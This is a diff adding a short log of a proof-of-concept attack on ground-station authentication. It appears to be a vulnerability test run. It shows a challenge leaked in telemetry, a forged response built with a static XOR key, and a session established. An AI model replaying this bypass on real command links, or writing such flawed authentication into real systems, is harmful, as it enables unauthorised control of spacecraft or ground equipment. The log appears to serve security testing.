@@ -1,0 +1,14 @@
+[   0.000] ========================================================================
+[   0.000] V0-06 GS auth: leaked challenge + static XOR key
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x11 via=radio AES  payload=01
+[   0.001] <-- TM apid=0x11 AES len=9
+[   0.001] --> TC apid=0x12 via=radio AES  payload=00
+[   0.001] <-- TM apid=0x12 AES len=13
+[   0.001] challenge LEAKED in telemetry: 0x1F26789C
+[   0.001] --> TC apid=0x12 via=radio AES  payload=01dff88252
+[   0.002] <-- TM apid=0x12 AES len=13
+[   0.002] phase1 auth_state=1 (0x01=session established)
+[   0.002] ========================================================================
+[   0.002] POC OK
+[   0.002] ========================================================================
